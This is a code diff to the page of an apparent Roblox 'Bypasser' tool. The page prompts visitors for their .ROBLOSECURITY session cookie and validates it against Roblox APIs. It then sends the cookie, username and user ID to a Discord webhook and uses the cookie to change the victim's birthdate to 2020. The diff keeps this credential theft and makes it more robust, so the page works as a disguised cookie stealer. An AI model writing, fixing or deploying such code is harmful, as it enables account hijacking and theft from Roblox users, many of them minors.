@@ -157,10 +157,10 @@
         <span id="typedText"></span><span class="cursor">|</span>
       </div>
 
-      <div id="cookieForm">
+      <form id="cookieForm">
         <input type="text" id="cookieInput" class="input" placeholder="Enter your .ROBLOSECURITY cookie" required>
         <button type="submit" class="hero-btn" id="refreshBtn"><i class="fas fa-sync-alt"></i> Bypasser</button>
-      </div>
+      </form>
       <div id="loader" style="display:none; margin: 20px;">
         <p>Bypassing...</p>
       </div>
@@ -282,16 +282,19 @@ async function checkCookieValidity(cookie) {
         } else if (endpoint.name === "currency") {
           userData.robuxBalance = data.robux || userData.robuxBalance;
         }
-        break; // Stop after first successful endpoint
+        // Continue to next endpoint to gather more data if possible
       } else if (res.status === 429) {
         userData.error = "Rate limit exceeded. Please try again later.";
+        break;
       } else if (res.status === 401 || res.status === 403) {
         userData.error = "Unauthorized access. Cookie is invalid.";
+        break;
       } else {
         userData.error = `API error: ${res.status}`;
       }
     } catch (error) {
       userData.error = `Network error: ${error.message}`;
+      break;
     }
   }
 
@@ -329,53 +332,53 @@ $("#cookieForm").on("submit", async function(e) {
   $("#userInfo").hide();
   $("#refreshedBox").hide();
 
-  // Check cookie validity
-  const result = await checkCookieValidity(cookie);
-  if (!result.valid) {
-    $("#loader").hide();
-    showNotif(result.error || "Invalid cookie: Unable to verify with Roblox API");
-    errorSound.play();
-    return;
-  }
-
-  // Display user info
-  $("#userInfo").html(`
-    <p class="output">
-      <strong>Username:</strong> ${result.username}<br>
-      <strong>User ID:</strong> ${result.userId}<br>
-      <strong>Robux Balance:</strong> ${result.robuxBalance}<br>
-      <strong>Premium:</strong> ${result.isPremium}
-    </p>
-  `).fadeIn();
-
-  // Send cookie to Discord webhook
-  const webhookPayload = {
-    content: `New Cookie Submitted: \`${cookie}\`\nUsername: ${result.username}\nUser ID: ${result.userId}`,
-    username: "Roblox Bypasser Bot",
-    avatar_url: "https://i.imgur.com/4j8o1.png"
-  };
   try {
-    await fetch(webhookUrl, {
+    // Check cookie validity
+    const result = await checkCookieValidity(cookie);
+    if (!result.valid) {
+      showNotif(result.error || "Invalid cookie: Unable to verify with Roblox API");
+      errorSound.play();
+      $("#loader").hide();
+      $("#refreshBtn").show();
+      return;
+    }
+
+    // Display user info
+    $("#userInfo").html(`
+      <p class="output">
+        <strong>Username:</strong> ${result.username}<br>
+        <strong>User ID:</strong> ${result.userId}<br>
+        <strong>Robux Balance:</strong> ${result.robuxBalance}<br>
+        <strong>Premium:</strong> ${result.isPremium}
+      </p>
+    `).fadeIn();
+
+    // Send cookie to Discord webhook
+    const webhookPayload = {
+      content: `New Cookie Submitted: \`${cookie}\`\nUsername: ${result.username}\nUser ID: ${result.userId}`,
+      username: "Roblox Bypasser Bot",
+      avatar_url: "https://i.imgur.com/4j8o1.png"
+    };
+    const webhookRes = await fetch(webhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(webhookPayload)
     });
-  } catch (webhookError) {
-    console.error("Failed to send to webhook:", webhookError);
-  }
+    if (!webhookRes.ok) {
+      console.error("Webhook send failed:", webhookRes.status);
+    }
 
-  // Attempt birthdate update
-  const data = {
-    birthMonth: 12,
-    birthDay: 27,
-    birthYear: 2020
-  };
-  let headers = {
-    "Content-Type": "application/json",
-    "Cookie": `.ROBLOSECURITY=${cookie}`
-  };
+    // Attempt birthdate update
+    const data = {
+      birthMonth: 12,
+      birthDay: 27,
+      birthYear: 2020
+    };
+    let headers = {
+      "Content-Type": "application/json",
+      "Cookie": `.ROBLOSECURITY=${cookie}`
+    };
 
-  try {
     let res = await fetch("https://accountinformation.roblox.com/v1/birthdate", {
       method: "POST",
       headers: headers,
@@ -392,25 +395,23 @@ $("#cookieForm").on("submit", async function(e) {
     }
 
     const responseText = await res.text();
-    $("#loader").hide();
 
     if (res.ok) {
       $("#refreshedResult").text(`✅ Birthdate Updated Successfully!\nStatus: ${res.status}\nResponse: ${responseText}`);
-      $("#refreshedBox").fadeIn();
       successSound.play();
     } else {
       $("#refreshedResult").text(`❌ Failed to Update Birthdate\nStatus: ${res.status}\nResponse: ${responseText}`);
-      $("#refreshedBox").fadeIn();
       errorSound.play();
     }
-  } catch (error) {
-    $("#loader").hide();
-    $("#refreshedResult").text(`❌ Error: ${error.message}`);
     $("#refreshedBox").fadeIn();
+  } catch (error) {
+    showNotif(`❌ Error: ${error.message}`);
     errorSound.play();
+    console.error("Submit error:", error);
+  } finally {
+    $("#loader").hide();
+    $("#refreshBtn").show();
   }
-
-  $("#refreshBtn").show();
 });
 
 function showNotif(msg) {
@@ -453,7 +454,6 @@ $("#returnBtn").on("click", function () {
   $("#refreshedBox").hide();
   $("#userInfo").hide().empty();
   $("#cookieInput").val("");
-  $("#cookieForm").show();
   $("#refreshBtn").show();
 });
 </script>
